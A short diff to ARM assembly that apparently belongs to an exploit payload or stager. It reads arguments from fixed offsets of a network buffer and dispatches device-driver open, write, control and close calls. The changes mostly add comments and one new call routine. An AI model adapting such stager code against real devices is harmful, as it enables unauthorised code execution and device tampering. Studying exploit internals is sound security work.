@@ -22,7 +22,7 @@ prepare:
 	// r5 = lan->buf[0xF0] - lan->fd
 	// r6 = lan->buf[0xF4] - arg stager address, PC-relative
 	// r7 = lan->buf[0xF8] - DD_HANDLE storage address
-	// r4 = lan->buf + 0xFC = lan + 0x100
+	// r4 = lan->buf + 0xFC == lan + 0x100
 	ldmia r4!, {r3, r5, r6, r7}
 	// r8 = r3 == lan->buf[0xEC]
 	mov r8, r3
@@ -38,7 +38,15 @@ prepare:
 	add pc, r6
 
 // r4 == lan->buf + 0x48
+call_proper:
+	// proper(*data, *intf, command);
+	// proper(buf + 0x50, buf[0x48], buf[0x4C]);
+	ldmia r4!, {r1, r2}
+	movs r0, r4
+	b call_ddev
+
 ddev_open:
+	// ddev_open(handle, *dev_name, *status, op_flag);
 	// *buf[0xF8] = ddev_open(buf + 0x50, buf[0x48], buf[0x4C]);
 	ldmia r4!, {r1, r2}
 	movs r0, r4
@@ -47,18 +55,20 @@ ddev_open:
 	b finish
 
 ddev_write:
-	// ddev_write(handle, data, size, addr);
+	// ddev_write(handle, *user_buf, count, addr);
 	// ddev_write(*buf[0xF8], buf + 0x50, buf[0x48], buf[0x4C]);
 	ldmia r4!, {r2, r3}
 	movs r1, r4
 	b call_ddev
 
 ddev_control:
+	// ddev_control(handle, cmd, *param);
 	// ddev_control(*buf[0xF8], buf[0x48], buf + 0x4C);
 	ldmia r4!, {r1}
 	movs r2, r4
 
 ddev_close:
+	// ddev_close(handle);
 	// ddev_close(*buf[0xF8]);
 
 call_ddev:
